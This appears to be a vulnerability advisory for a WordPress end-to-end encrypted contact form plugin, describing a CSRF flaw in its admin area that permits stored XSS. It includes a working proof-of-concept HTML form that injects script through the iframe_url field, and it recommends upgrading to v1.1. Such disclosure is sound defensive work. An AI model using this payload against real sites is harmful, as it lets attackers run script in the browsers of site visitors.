## Product Information:

Secure contact form for WordPress. Uses end-to-end encryption to send user
information. Not even your hosting provider can view the content.

Let users send you information in a secure way. Uses I.CX messaging service
to encrypt user content in their own web browsers before sending to you.

## Vulnerability Description:

The forms in the admin area of the plugin are vulnerable to CSRF, via which
the contact forms generated are susceptible to XSS via unsanitized POST
parametre.

For example, the admin function of updating an existing form can be done
via CSRF. Hence, by submitting a crafted HTML string in the parametres via
CSRF, a XSS attack gets launched which affects all the visitors of the
page(s) containing the contact form.

## Proof of Concept:

<form action="http://localhost/wp-admin/options-general.php?page=conformconf";
method="post">
<input type="hidden" name="name" value="required" />
<input type="hidden" name="email" value="optional" />
<input type="hidden" name="phone" value="off" />
<input type="hidden" name="message" value="required" />
<input type="hidden" name="display_name" value="Example" />
<input type="hidden" name="recipient_name" value="example" />
<input type="hidden" name="cfc_page_name" value="" />
<!-- Wordpress page-id value -->
<input type="hidden" name="existing_page" value="28" />
<input type="hidden" name="cfc_selection" value="upd" />
<input type="hidden" name="iframe_url"
value=""></iframe><script>alert('XSS!');</script>"
/>
<input type="submit" value="Update Page">
</form>

## Solution:

Upgrade to v1.1 of the plugin.
